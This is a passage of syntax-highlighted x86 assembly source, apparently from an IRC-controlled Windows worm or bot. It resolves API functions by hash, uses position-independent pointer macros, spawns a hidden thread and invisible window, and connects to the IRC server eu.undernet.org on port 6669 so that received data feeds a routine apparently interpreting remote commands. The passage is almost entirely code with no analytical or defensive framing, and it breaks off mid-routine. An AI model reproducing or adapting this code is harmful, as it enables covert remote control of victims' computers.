            </span><span class="sc5">CSyscall</span><span class="sc0">        </span><span class="sc5">LoadLib</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">skiploadnet</span><span class="sc0">

        </span><span class="sc5">CSyscall</span><span class="sc0">    </span><span class="sc5">registernet</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skiploadnet</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
            </span><span class="sc5">CSyscall</span><span class="sc0">        </span><span class="sc5">LoadLib</span><span class="sc0">

                </span><span class="sc1">; call initnetwork</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">12</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">netinit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">crt1</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">            </span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">            </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">            </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">            </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">            </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">            </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc5">P_apicall</span><span class="sc0">       </span><span class="sc2">0CA2C0A90h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Create Thread</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">             </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

        </span><span class="sc5">skiploadnet</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">wsocklib</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'wsock32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">WM_SOCKET</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">hostname</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'eu.undernet.org'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CClassName</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ICC'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CAppName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WAp'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">port</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">6669</span><span class="sc0">
</span><span class="sc5">sock</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">AppHandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">sin</span><span class="sc4">:</span><span class="sc0">    

</span><span class="sc5">sin_family</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sin_port</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sin_addr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sin_zero</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">recdata</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">netinit</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">
    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">GetTim</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ni11</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">recdata</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ni12</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">             </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">             </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">             </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc5">commproc</span><span class="sc4">,</span><span class="sc5">cm11</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">             </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">             </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">            </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">C_apicall</span><span class="sc0">       </span><span class="sc2">01017D1A1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; GetModuleHandle</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">             </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">             </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">             </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">             </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">             </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc5">CClassName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cm12</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc5">C_apicall</span><span class="sc0"> </span><span class="sc2">0D48A96AAh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; RegisterClassA</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">C_apicall</span><span class="sc0"> </span><span class="sc2">01017D1A1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; GetModuleHandle</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc5">CAppName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cm13</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc5">CClassName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cm14</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">C_apicall</span><span class="sc0"> </span><span class="sc2">7099fb9ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; CreateWindowEx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">initconnect</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'OKAY'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">skipconnect</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">layer2init</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'OKAY'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">skipconnect</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">44</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc5">skipbreakit</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc5">C_apicall</span><span class="sc0"> </span><span class="sc2">03BAC79F3h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; GetMessageA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc5">C_apicall</span><span class="sc0"> </span><span class="sc2">050d9920Ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; TranslateMessageA</span><span class="sc0">
                </span><span class="sc5">C_apicall</span><span class="sc0"> </span><span class="sc2">05BFFA45Ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; dispatchMessageA</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipbreakit</span><span class="sc0">

        </span><span class="sc5">skipconnect</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">sock</span><span class="sc4">,</span><span class="sc5">t5</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">C_apicall</span><span class="sc0"> </span><span class="sc2">0F9AAA3C4h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc5">C_apicall</span><span class="sc0"> </span><span class="sc2">0A3498CD8h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">C_apicall</span><span class="sc0"> </span><span class="sc2">790c0575h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">; ExitThread</span><span class="sc0">

</span><span class="sc5">commproc</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">umsgval</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">returnnullk</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">umsgval</span><span class="sc4">],</span><span class="sc2">05</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">returnnullk</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">umsgval</span><span class="sc4">],</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipthisonecomm</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">C_apicall</span><span class="sc0"> </span><span class="sc2">07818C6Bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; PostQuitMessage</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">skipthisonecomm</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">umsgval</span><span class="sc4">],</span><span class="sc5">WM_SOCKET</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">skipnetwork</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">lpamval</span><span class="sc4">]</span><span class="sc0">
    
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                  </span><span class="sc1">; FD_READ</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipnetwork1</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">skipnetwork</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1024</span><span class="sc0">        
        </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">recdata</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">comp1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">sock</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">comp2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">C_apicall</span><span class="sc0"> </span><span class="sc2">80670h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">               </span><span class="sc1">; WSOCK32!recv</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">layer2interp</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

    </span><span class="sc5">skipnetwork1</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipnetwork</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">layer1uninit</span><span class="sc0">

</span><span class="sc5">skipnetwork</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">lpamval</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">wpamval</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">umsgval</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">hwndval</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc5">C_apicall</span><span class="sc0"> </span><span class="sc2">23ED6274h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                             </span><span class="sc1">; User32!DefWindowProc</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">returnk</span><span class="sc0">

</span><span class="sc5">returnnullk</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">returnk</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc1">;include debug\debug.asm</span><span class="sc0">

</span><span class="sc5">initconnect</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">recdata</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">icn1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0101h</span><span class="sc0">

</span><span class="sc5">C_apicall</span><span class="sc0"> </span><span class="sc2">0A568A8D8h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">             </span><span class="sc1">; WSAStartup</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ic_finish1</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; SOCK_STREAM</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">; AF_INET</span><span class="sc0">

    </span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">20AA2E0h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">     </span><span class="sc1">; socket</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; INVALID_SOCKET</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ic_finish2</span><span class="sc0">

        </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sock</span><span class="sc4">,</span><span class="sc5">icc5</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sin_family</span><span class="sc4">,</span><span class="sc5">icc3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; AF_INET</span><span class="sc0">

        </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">port</span><span class="sc4">,</span><span class="sc5">ick1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        
        </span><span class="sc5">C_apicall</span><span class="sc0">       </span><span class="sc2">03C3D18h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">     </span><span class="sc1">; htons</span><span class="sc0">

        </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sin_port</span><span class="sc4">,</span><span class="sc5">icc4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc5">hostname</span><span class="sc4">,</span><span class="sc5">icn2</span><span class="sc0">
                </span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">0FB4C7B3Dh</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">           </span><span class="sc1">; gethostbyname</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
